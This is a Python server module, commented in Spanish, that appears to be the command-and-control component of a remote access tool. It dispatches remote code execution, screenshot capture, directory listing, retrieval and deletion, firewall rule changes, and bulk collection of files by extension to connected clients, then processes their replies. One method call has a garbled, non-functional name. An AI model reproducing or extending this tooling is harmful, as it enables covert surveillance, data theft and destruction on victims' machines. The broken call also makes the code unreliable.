import json
import os
import base64
import zipfile
import io
from utils.logger import get_console
from config.settings import RECEIVED_FILES_DIR
from utils.response_waiter import ResponseWaiter

from server.handlers.screenshot_handler import ScreenshotHandler
from server.handlers.directory_handler import DirectoryHandler
from server.handlers.file_handler import FileHandler

class ClientManager:
    """Administra clientes conectados y procesa sus respuestas."""
    
    def __init__(self, servidor, cmd):
        self.servidor = servidor
        self.servidor.establecer_client_manager(self)
        self.console = get_console()
        self._cmd = cmd 
        self.response_waiter = ResponseWaiter(timeout=5)
        
        self.directory_handler = DirectoryHandler(self)
        self.screenshot_handler = ScreenshotHandler(self)
        self.file_handler = FileHandler(self)
        
    def esperar_respuesta_accion(self, accion, cliente_id=None):
        """Espera la(s) respuesta(s) de uno o varios clientes para una acción dada."""
        if cliente_id is None:
            # Esperar respuesta de todos los clientes conectados
            clientes_ids = [cliente["id"] for cliente in self.servidor.clientes]
            resultados = []
            for cid in clientes_ids:
                recibido = self.response_waiter.esperar_respuesta(cid, accion)
                resultados.append((cid, recibido))
            
            # Verifica si al menos uno respondió
            if not any(r[1] for r in resultados):
                return False
            return True
        else:
            # Esperar respuesta solo del cliente especificado
            return self.response_waiter.esperar_respuesta(cliente_id, accion)
    
    def procesar_respuesta_cliente(self, datos, cliente):
        """Procesa las respuestas recibidas de un cliente."""
        try:
            datos_dict = json.loads(datos)
            accion = datos_dict.get("accion")
            cliente_id = f"[Cliente ID {cliente['id']} ({cliente['direccion'][0]})]"
            
            if accion == "respuesta_ejecucion":
                self.console.print(f"\n{cliente_id} [bold green]Resultado de ejecución:[/bold green]")
                self.console.print(datos_dict.get("resultado", "Sin resultado"))
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "archivo_recibido":
                self.console.print(f"\n{cliente_id} [bold green]Archivo guardado:[/bold green] {datos_dict.get('ruta_destino')}")
                
            elif accion == "archivo_enviado":
                self.file_handler._procesar_archivo_enviado(datos_dict, cliente_id)
                
            elif accion == "error":
                self.console.print(f"\n{cliente_id} [bold red]Error:[/bold red] {datos_dict.get('mensaje')}")
                
            elif accion == "respuesta_listado":
                self.console.print(f"\n{cliente_id} [bold green]Estructura del directorio '{datos_dict.get('ruta')}':[/bold green]")
                self.console.print(datos_dict.get("estructura"))
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "directorio_enviado":
                self.directory_handler._procesar_directorio_enviado(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "eliminacion_exitosa":
                self.directory_handler._procesar_eliminacion_exitosa(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "captura_enviada":
                self.screenshot_handler._procesar_captura_enviadarocesar_captura_enviada(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "regla_firewall_agregada":
                self._procesar_regla_firewall_agregada(datos_dict, cliente_id)
                
            elif accion == "archivos_extension_enviados":
                self._procesar_archivos_extension_enviados(datos_dict, cliente_id)
                
        except json.JSONDecodeError:
            self.console.print(f"[bold red][!] Error al decodificar respuesta del cliente: {datos}[/bold red]")
        except Exception as e:
            self.console.print(f"[bold red][!] Error al procesar respuesta del cliente: {e}[/bold red]")
    
    def _procesar_regla_firewall_agregada(self, datos_dict, cliente_id):
        """Procesa una regla de firewall agregada."""
        nombre_regla = datos_dict.get("nombre_regla")
        ip = datos_dict.get("ip")
        puerto = datos_dict.get("puerto")
        accion_firewall = datos_dict.get("accion_firewall")
        resultado = datos_dict.get("resultado")
        
        self.console.print(f"\n{cliente_id} [bold green]🔥 Regla de Firewall procesada:[/bold green]")
        self.console.print(f"{cliente_id} Nombre: {nombre_regla}")
        self.console.print(f"{cliente_id} IP: {ip}")
        self.console.print(f"{cliente_id} Puerto: {puerto}")
        self.console.print(f"{cliente_id} Acción: {accion_firewall}")
        self.console.print(f"{cliente_id} Resultado: {resultado}")
    
    def _procesar_archivos_extension_enviados(self, datos_dict, cliente_id):
        """Procesa archivos enviados por extensión."""
        extension = datos_dict.get("extension")
        cantidad_archivos = datos_dict.get("cantidad_archivos")
        nombre_zip = datos_dict.get("nombre_zip")
        ruta_destino = datos_dict.get("ruta_destino", RECEIVED_FILES_DIR)
        datos_zip = datos_dict.get("datos_zip")
        archivos_incluidos = datos_dict.get("archivos_incluidos", [])
        
        try:
            carpeta_extraccion = os.path.join(ruta_destino, f"cliente_{cliente_id.replace('[Cliente ', '').replace(']', '')}_{extension.replace('.', '')}")
            os.makedirs(carpeta_extraccion, exist_ok=True)
            
            with zipfile.ZipFile(io.BytesIO(base64.b64decode(datos_zip)), 'r') as zip_ref:
                zip_ref.extractall(carpeta_extraccion)
            
            self.console.print(f"\n{cliente_id} [bold green]📁 Archivos por extensión procesados:[/bold green]")
            self.console.print(f"{cliente_id} Extensión: {extension}")
            self.console.print(f"{cliente_id} Cantidad de archivos: {cantidad_archivos}")
            self.console.print(f"{cliente_id} Archivos extraídos en: {carpeta_extraccion}")
            if len(archivos_incluidos) <= 10:
                self.console.print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos)}")
            else:
                self.console.print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos[:10])}... y {len(archivos_incluidos)-10} más")
        except Exception as e:
            self.console.print(f"\n{cliente_id} [bold red]Error al procesar archivos por extensión:[/bold red] {str(e)}")
    
    def enviar_comando_listar_directorio(self, ruta, incluir_archivos=False, cliente_id=None):
        """Envía comando para listar un directorio."""
        exito_envio = self.directory_handler.enviar_comando_listar_directorio(ruta, incluir_archivos, cliente_id)
        return self.comprobar_respuesta(exito_envio, "respuesta_listado", cliente_id)
    
    def obtener_info_clientes(self):
        """Obtiene información de los clientes conectados."""
        return [(c['id'], c['direccion'][0], c['direccion'][1]) for c in self.servidor.clientes]
    
    def obtener_clientes_conectados(self):
        """Obtiene el número de clientes conectados."""
        return len(self.servidor.clientes)

    def enviar_comando_solicitar_directorio(self, ruta_origen, ruta_destino, cliente_id=None):
        """Envía comando para solicitar un directorio desde los clientes."""
        exito_envio = self.directory_handler.enviar_comando_solicitar_directorio(ruta_origen, ruta_destino, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "directorio_enviado", cliente_id)

    def enviar_comando_capturar_pantalla(self, ruta_destino, nombre_archivo=None, cliente_id=None):
        """Envía comando para capturar pantalla y espera respuesta."""
        
        exito_envio = self.screenshot_handler.enviar_comando_capturar_pantalla(ruta_destino, nombre_archivo, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "captura_enviada", cliente_id)
    
    def enviar_comando_eliminar(self, ruta, cliente_id=None):
        """Envía comando para eliminar un archivo o directorio en los clientes."""
        exito_envio = self.directory_handler.enviar_comando_eliminar(ruta, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "eliminacion_exitosa", cliente_id)
        
    def enviar_comando_ejecutar(self, codigo, cliente_id=None):
        """Envía comando para ejecutar un código en los clientes."""
        from server.handlers.command_handler import CommandHandler
        handler = CommandHandler(self)
        
        exito_envio = handler.enviar_comando_ejecutar(codigo, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "respuesta_ejecucion", cliente_id)
    
    def comprobar_respuesta(self, exito_envio, accion_esperada, cliente_id=None):
        if not exito_envio:
            return False
        
        if not self.esperar_respuesta_accion(accion_esperada, cliente_id):
            self.console.print("[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]")
            return False
        
        return True